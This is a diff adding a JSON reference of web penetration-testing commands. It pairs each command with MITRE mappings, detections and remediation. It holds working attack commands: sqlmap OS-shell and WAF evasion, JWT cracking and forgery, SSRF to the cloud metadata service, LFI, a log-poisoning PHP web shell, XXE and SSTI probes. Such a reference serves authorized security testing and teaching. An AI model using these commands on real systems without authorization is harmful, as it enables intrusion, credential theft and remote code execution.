@@ -1,0 +1,632 @@
+[
+  {
+    "id": "ffuf-subdomain",
+    "tool": "ffuf",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "ffuf -u http://<target> -H 'Host: FUZZ.target.com' -w subdomains.txt -fs <size>",
+    "name": "Subdomain via Host Header",
+    "description": "Discovers virtual hosts by fuzzing Host header.",
+    "arguments": {
+      "-H": "Custom Host header",
+      "-fs": "Filter default size"
+    },
+    "expected_output": "dev [200, 4521]\nstaging [200, 3892]",
+    "use_case": "Find hidden vhosts on same IP.",
+    "prerequisites": [
+      "Target IP",
+      "Default response size known"
+    ],
+    "mitre_mapping": [
+      "T1595"
+    ],
+    "mitre_tactic": "Reconnaissance",
+    "detections": [
+      "Unusual Host headers in logs"
+    ],
+    "remediation": [
+      "Reject unknown Host headers"
+    ],
+    "common_mistakes": [
+      "Not filtering default response"
+    ],
+    "alternatives": [
+      "gobuster vhost",
+      "wfuzz"
+    ],
+    "references": [
+      "https://github.com/ffuf/ffuf"
+    ],
+    "tags": [
+      "vhost",
+      "subdomain",
+      "host-header",
+      "fuzzing"
+    ]
+  },
+  {
+    "id": "sqlmap-os-shell",
+    "tool": "sqlmap",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "sqlmap -u 'http://<target>/page?id=1' --os-shell",
+    "name": "SQLMap OS Shell",
+    "description": "Attempts to get an operating system shell through SQL injection.",
+    "arguments": {
+      "--os-shell": "Get OS command execution via SQLi"
+    },
+    "expected_output": "os-shell> whoami\nwww-data",
+    "use_case": "Escalate SQL injection to full command execution on the server.",
+    "prerequisites": [
+      "Confirmed SQL injection",
+      "DBA privileges or FILE privilege"
+    ],
+    "mitre_mapping": [
+      "T1190",
+      "T1059"
+    ],
+    "mitre_tactic": "Execution",
+    "detections": [
+      "Unusual file writes by DB process",
+      "Command execution from DB user"
+    ],
+    "remediation": [
+      "Least privilege for DB accounts",
+      "Disable FILE privilege"
+    ],
+    "common_mistakes": [
+      "DB user doesn't have FILE privilege"
+    ],
+    "alternatives": [
+      "manual INTO OUTFILE",
+      "xp_cmdshell (MSSQL)"
+    ],
+    "references": [
+      "https://sqlmap.org"
+    ],
+    "tags": [
+      "sqli",
+      "rce",
+      "os-shell",
+      "command-execution"
+    ]
+  },
+  {
+    "id": "sqlmap-tamper",
+    "tool": "sqlmap",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "sqlmap -u 'http://<target>/page?id=1' --tamper=space2comment,between --batch",
+    "name": "SQLMap WAF Bypass (Tamper)",
+    "description": "Uses tamper scripts to bypass WAF/IPS SQL injection filters.",
+    "arguments": {
+      "--tamper": "Evasion scripts (comma-separated)"
+    },
+    "expected_output": "[*] WAF/IPS detected, using tamper scripts\n[+] Parameter 'id' is vulnerable",
+    "use_case": "Bypass WAF rules that block standard SQL injection payloads.",
+    "prerequisites": [
+      "WAF blocking standard payloads"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "Modified SQL patterns in WAF logs"
+    ],
+    "remediation": [
+      "Update WAF rules",
+      "Use parameterized queries"
+    ],
+    "common_mistakes": [
+      "Not trying multiple tamper combinations"
+    ],
+    "alternatives": [
+      "manual encoding",
+      "custom payloads"
+    ],
+    "references": [
+      "https://sqlmap.org"
+    ],
+    "tags": [
+      "sqli",
+      "waf-bypass",
+      "tamper",
+      "evasion"
+    ]
+  },
+  {
+    "id": "dalfox-xss",
+    "tool": "dalfox",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "dalfox url 'http://<target>/search?q=test' --blind <callback>",
+    "name": "Advanced XSS Scanner",
+    "description": "Next-gen XSS scanner with DOM analysis, blind XSS support, and WAF bypass.",
+    "arguments": {
+      "url": "Target with parameter",
+      "--blind": "Blind XSS callback URL"
+    },
+    "expected_output": "[POC] http://target/search?q=<script>alert(1)</script>\n[VULN] Reflected XSS found",
+    "use_case": "Find XSS vulnerabilities including blind and DOM-based variants.",
+    "prerequisites": [
+      "URL with reflectable parameter"
+    ],
+    "mitre_mapping": [
+      "T1059.007"
+    ],
+    "mitre_tactic": "Execution",
+    "detections": [
+      "XSS payloads in WAF logs",
+      "CSP violation reports"
+    ],
+    "remediation": [
+      "CSP headers",
+      "Output encoding",
+      "Input sanitization"
+    ],
+    "common_mistakes": [
+      "Only testing reflected (miss stored/DOM)"
+    ],
+    "alternatives": [
+      "xsstrike",
+      "burp scanner"
+    ],
+    "references": [
+      "https://github.com/hahwul/dalfox"
+    ],
+    "tags": [
+      "xss",
+      "dom",
+      "blind",
+      "scanner",
+      "advanced"
+    ]
+  },
+  {
+    "id": "jwt-tool-crack",
+    "tool": "jwt_tool",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt",
+    "name": "JWT Secret Cracking",
+    "description": "Attempts to crack the JWT signing secret for token forgery.",
+    "arguments": {
+      "-C": "Crack mode",
+      "-d": "Dictionary file"
+    },
+    "expected_output": "[+] SECRET FOUND: supersecret123\n[+] You can now forge tokens",
+    "use_case": "Crack weak JWT secrets to forge authentication tokens.",
+    "prerequisites": [
+      "JWT token",
+      "Wordlist"
+    ],
+    "mitre_mapping": [
+      "T1078"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "N/A \u2014 offline attack"
+    ],
+    "remediation": [
+      "Use strong random secrets (256+ bit)",
+      "Use asymmetric algorithms (RS256)"
+    ],
+    "common_mistakes": [
+      "Token uses RS256 (can't crack)"
+    ],
+    "alternatives": [
+      "hashcat -m 16500",
+      "john jwt"
+    ],
+    "references": [
+      "https://github.com/ticarpi/jwt_tool"
+    ],
+    "tags": [
+      "jwt",
+      "token",
+      "cracking",
+      "authentication",
+      "forgery"
+    ]
+  },
+  {
+    "id": "jwt-tool-forge",
+    "tool": "jwt_tool",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "python3 jwt_tool.py <token> -T -S hs256 -p 'secret' -I -pc role -pv admin",
+    "name": "JWT Token Forgery",
+    "description": "Forges a new JWT with modified claims using a known secret.",
+    "arguments": {
+      "-T": "Tamper mode",
+      "-S": "Signing algorithm",
+      "-p": "Secret",
+      "-I": "Inject claims",
+      "-pc/-pv": "Claim name/value"
+    },
+    "expected_output": "[+] Forged token: eyJhbGciOiJIUzI1NiJ9...",
+    "use_case": "Escalate privileges by modifying JWT claims (e.g., role: user \u2192 admin).",
+    "prerequisites": [
+      "Known JWT secret",
+      "Understanding of token claims"
+    ],
+    "mitre_mapping": [
+      "T1078"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Token with unexpected claims",
+      "Admin actions from non-admin user"
+    ],
+    "remediation": [
+      "Validate claims server-side",
+      "Don't trust client tokens alone"
+    ],
+    "common_mistakes": [
+      "Not understanding token structure"
+    ],
+    "alternatives": [
+      "manual base64 editing + signing"
+    ],
+    "references": [
+      "https://github.com/ticarpi/jwt_tool"
+    ],
+    "tags": [
+      "jwt",
+      "forgery",
+      "privilege-escalation",
+      "claims"
+    ]
+  },
+  {
+    "id": "ssrf-basic",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl 'http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/'",
+    "name": "SSRF \u2014 Cloud Metadata",
+    "description": "Tests for Server-Side Request Forgery to access cloud instance metadata.",
+    "arguments": {
+      "url parameter": "User-controlled URL that server fetches"
+    },
+    "expected_output": "ami-id: ami-12345\ninstance-type: t2.micro\niam-role: admin-role",
+    "use_case": "Access cloud metadata service via SSRF \u2014 can reveal IAM credentials and instance info.",
+    "prerequisites": [
+      "URL parameter that fetches remote content",
+      "Target on cloud (AWS/GCP/Azure)"
+    ],
+    "mitre_mapping": [
+      "T1190",
+      "T1552"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "Requests to 169.254.169.254 from application",
+      "Unusual internal requests"
+    ],
+    "remediation": [
+      "Block metadata IP in application",
+      "Use IMDSv2 (token required)",
+      "Input validation on URLs"
+    ],
+    "common_mistakes": [
+      "Not trying different protocols (file://, gopher://)"
+    ],
+    "alternatives": [
+      "manual testing with Burp"
+    ],
+    "references": [
+      "https://portswigger.net/web-security/ssrf"
+    ],
+    "tags": [
+      "ssrf",
+      "cloud",
+      "metadata",
+      "aws",
+      "internal"
+    ]
+  },
+  {
+    "id": "lfi-basic",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl 'http://<target>/page?file=../../../../etc/passwd'",
+    "name": "Local File Inclusion (LFI)",
+    "description": "Tests for path traversal / local file inclusion to read server files.",
+    "arguments": {
+      "file parameter": "Path traversal payload"
+    },
+    "expected_output": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:...",
+    "use_case": "Read sensitive files from the server \u2014 /etc/passwd, config files, source code.",
+    "prerequisites": [
+      "File inclusion parameter",
+      "Linux target"
+    ],
+    "mitre_mapping": [
+      "T1005"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "Path traversal patterns in logs (../)",
+      "Access to sensitive file paths"
+    ],
+    "remediation": [
+      "Input validation",
+      "Chroot/jail",
+      "Disable allow_url_include"
+    ],
+    "common_mistakes": [
+      "Not trying enough ../ levels",
+      "Missing null byte (%00) for older PHP"
+    ],
+    "alternatives": [
+      "dotdotpwn",
+      "burp intruder with traversal list"
+    ],
+    "references": [
+      "https://portswigger.net/web-security/file-path-traversal"
+    ],
+    "tags": [
+      "lfi",
+      "path-traversal",
+      "file-read",
+      "inclusion"
+    ]
+  },
+  {
+    "id": "lfi-to-rce",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "curl 'http://<target>/page?file=/var/log/apache2/access.log' -A '<?php system($_GET[\"cmd\"]); ?>'",
+    "name": "LFI to RCE (Log Poisoning)",
+    "description": "Escalates LFI to Remote Code Execution by poisoning log files with PHP code.",
+    "arguments": {
+      "-A": "User-Agent (injected into access log)",
+      "file=...access.log": "Include the poisoned log"
+    },
+    "expected_output": "# After poisoning:\ncurl 'http://target/page?file=/var/log/apache2/access.log&cmd=whoami'\nwww-data",
+    "use_case": "Turn file read into code execution by injecting PHP into log files.",
+    "prerequisites": [
+      "Confirmed LFI",
+      "Log file path known",
+      "PHP enabled"
+    ],
+    "mitre_mapping": [
+      "T1059"
+    ],
+    "mitre_tactic": "Execution",
+    "detections": [
+      "PHP code in User-Agent",
+      "Log file access via web"
+    ],
+    "remediation": [
+      "Restrict log file permissions",
+      "Disable allow_url_include",
+      "WAF rules"
+    ],
+    "common_mistakes": [
+      "Log file path varies by distro",
+      "PHP not processing included file"
+    ],
+    "alternatives": [
+      "php://filter wrapper",
+      "data:// wrapper"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion"
+    ],
+    "tags": [
+      "lfi",
+      "rce",
+      "log-poisoning",
+      "php",
+      "escalation"
+    ]
+  },
+  {
+    "id": "idor-test",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl -H 'Cookie: session=<your_token>' 'http://<target>/api/users/2'",
+    "name": "IDOR Testing",
+    "description": "Tests for Insecure Direct Object References by accessing other users' data.",
+    "arguments": {
+      "Cookie": "Your session",
+      "users/2": "Another user's ID"
+    },
+    "expected_output": "{\n  \"id\": 2,\n  \"name\": \"Other User\",\n  \"email\": \"other@corp.com\",\n  \"ssn\": \"123-45-6789\"\n}",
+    "use_case": "Access other users' data by changing ID parameters \u2014 extremely common vulnerability.",
+    "prerequisites": [
+      "Authenticated session",
+      "Predictable object IDs"
+    ],
+    "mitre_mapping": [
+      "T1530"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "Access to objects not owned by user",
+      "Sequential ID access patterns"
+    ],
+    "remediation": [
+      "Implement authorization checks",
+      "Use UUIDs instead of sequential IDs",
+      "Validate object ownership"
+    ],
+    "common_mistakes": [
+      "Only testing one endpoint",
+      "Not trying different HTTP methods"
+    ],
+    "alternatives": [
+      "burp autorize extension",
+      "authmatrix"
+    ],
+    "references": [
+      "https://portswigger.net/web-security/access-control/idor"
+    ],
+    "tags": [
+      "idor",
+      "authorization",
+      "access-control",
+      "broken-auth"
+    ]
+  },
+  {
+    "id": "xxe-basic",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl -X POST 'http://<target>/api/parse' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>'",
+    "name": "XXE Injection",
+    "description": "Tests for XML External Entity injection to read server files.",
+    "arguments": {
+      "Content-Type: application/xml": "XML content",
+      "<!ENTITY xxe SYSTEM>": "External entity definition",
+      "&xxe;": "Entity reference"
+    },
+    "expected_output": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:...",
+    "use_case": "Read files, perform SSRF, or achieve RCE through XML parsing vulnerabilities.",
+    "prerequisites": [
+      "Endpoint accepting XML input"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "XML parsing errors",
+      "External entity resolution attempts"
+    ],
+    "remediation": [
+      "Disable external entities in XML parser",
+      "Use JSON instead of XML",
+      "Input validation"
+    ],
+    "common_mistakes": [
+      "Endpoint doesn't accept XML",
+      "Entity expansion disabled"
+    ],
+    "alternatives": [
+      "burp collaborator (blind XXE)",
+      "oxml_xxe"
+    ],
+    "references": [
+      "https://portswigger.net/web-security/xxe"
+    ],
+    "tags": [
+      "xxe",
+      "xml",
+      "injection",
+      "file-read",
+      "entity"
+    ]
+  },
+  {
+    "id": "ssti-test",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl 'http://<target>/page?name={{7*7}}'",
+    "name": "SSTI Detection",
+    "description": "Tests for Server-Side Template Injection by injecting template expressions.",
+    "arguments": {
+      "{{7*7}}": "Jinja2/Twig expression (should return 49 if vulnerable)"
+    },
+    "expected_output": "Hello 49! (instead of Hello {{7*7}}!)",
+    "use_case": "Detect template injection \u2014 can lead to RCE in frameworks like Flask/Jinja2, Django, Twig.",
+    "prerequisites": [
+      "Parameter reflected in page",
+      "Template engine in use"
+    ],
+    "mitre_mapping": [
+      "T1059"
+    ],
+    "mitre_tactic": "Execution",
+    "detections": [
+      "Template syntax in parameters",
+      "Unusual server errors"
+    ],
+    "remediation": [
+      "Sandbox template engines",
+      "Don't pass user input to templates",
+      "Use logic-less templates"
+    ],
+    "common_mistakes": [
+      "Not trying different template syntaxes (${}, #{}, <%)"
+    ],
+    "alternatives": [
+      "tplmap (automated)",
+      "burp scanner"
+    ],
+    "references": [
+      "https://portswigger.net/web-security/server-side-template-injection"
+    ],
+    "tags": [
+      "ssti",
+      "template",
+      "injection",
+      "rce",
+      "jinja2"
+    ]
+  }
+]
